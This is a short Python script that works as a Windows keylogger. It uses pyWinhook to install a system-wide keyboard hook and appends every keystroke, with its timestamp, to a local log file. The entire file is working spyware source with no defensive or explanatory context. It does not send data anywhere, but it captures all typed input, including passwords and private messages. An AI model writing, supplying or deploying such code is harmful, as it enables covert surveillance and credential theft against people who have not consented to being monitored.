import os
import sys
import pyWinhook
import pythoncom

def on_keyboard_event(event):
    # Log the event to a file
    with open("keyboard_log.txt", "a") as f:
        f.write(f"Key: {event.Key}, Time: {event.Time}\n")
    return True

def start_keylogger():
    hook_manager = pyWinhook.HookManager()
    hook_manager.KeyDown = on_keyboard_event
    hook_manager.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == "__main__":
    try:
        start_keylogger()
    except ImportError:
        print("pywinhook and pythoncom are required to run this program.")
